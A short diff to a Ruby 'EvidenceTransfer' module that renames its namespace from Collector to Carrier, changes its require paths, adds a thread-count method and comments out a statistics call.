@@ -2,19 +2,22 @@
 #  Evidence Transfer module for transferring evidence to the db
 #
 
-require_relative 'db.rb'
-require_relative 'evidence_manager.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/fixnum'
 require 'rcs-common/symbolize'
+require 'rcs-common/path_utils'
+
+require_release 'rcs-collector/db'
+require_release 'rcs-collector/evidence_manager'
+
 
 # from system
 require 'thread'
 
 module RCS
-module Collector
+module Carrier
 
 class EvidenceTransfer
   include Singleton
@@ -94,6 +97,10 @@ class EvidenceTransfer
     retry
   end
 
+  def threads
+    @threads.size
+  end
+
   def get_evidence(instance)
     info = EvidenceManager.instance.instance_info instance
     EvidenceManager.instance.purge(instance, {force: true}) if info.nil?
@@ -114,7 +121,7 @@ class EvidenceTransfer
     if ret
       trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
 
-      StatsManager.instance.add ev_output: 1, ev_output_size: evidence.size
+      #StatsManager.instance.add ev_output: 1, ev_output_size: evidence.size
 
       EvidenceManager.instance.del_evidence(id, instance) if action == :delete
     else
